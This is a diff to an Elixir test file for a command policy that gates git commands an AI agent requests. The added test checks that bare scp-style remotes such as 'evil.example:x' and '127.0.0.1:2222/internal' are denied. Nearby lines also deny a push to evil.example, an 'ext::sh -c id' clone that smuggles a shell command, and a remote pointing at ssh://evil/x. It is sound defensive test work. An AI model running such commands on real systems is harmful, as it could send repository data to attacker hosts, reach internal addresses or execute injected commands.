@@ -276,6 +276,25 @@ defmodule TriOnyx.GitHub.CommandPolicyTest do
       assert {:deny, _} = CommandPolicy.classify("git", ["push", "https://evil.example/r", "main"])
     end
 
+    test "bare scp-style host:path remotes (no user@) are denied" do
+      # git's scp-like syntax `[user@]host:path` does not require the
+      # `user@` prefix — a bare `host:path` (no slash before the colon)
+      # is enough for git to open an ssh transport to `host`. The remote
+      # guard's `user@host:path` check alone lets this slip through as a
+      # non-"remote-like" argument, so the gateway process itself would
+      # open an outbound ssh connection to an attacker-chosen host —
+      # including internal-only addresses — on the agent's say-so.
+      assert {:deny, _} = CommandPolicy.classify("git", ["fetch", "evil.example:x", "main"])
+      assert {:deny, _} = CommandPolicy.classify("git", ["ls-remote", "evil.example:22"])
+      assert {:deny, _} = CommandPolicy.classify("git", ["pull", "127.0.0.1:2222/internal", "main"])
+      assert {:deny, _} = CommandPolicy.classify("git", ["push", "evil.example:x", "main"])
+
+      # A refspec legitimately contains ':' (e.g. `src:dst`) and must stay
+      # allowed — only the remote-position argument is scp-syntax-checked.
+      assert :allow = CommandPolicy.classify("git", ["push", "origin", "feature:refs/heads/feature"])
+      assert :allow = CommandPolicy.classify("git", ["push", "origin", "HEAD:fix/issue-42"])
+    end
+
     test "the guard also covers verbs that are denied for other reasons" do
       assert {:deny, _} = CommandPolicy.classify("git", ["clone", "ext::sh -c id", "dir"])
       assert {:deny, _} = CommandPolicy.classify("git", ["remote", "add", "evil", "ssh://evil/x"])
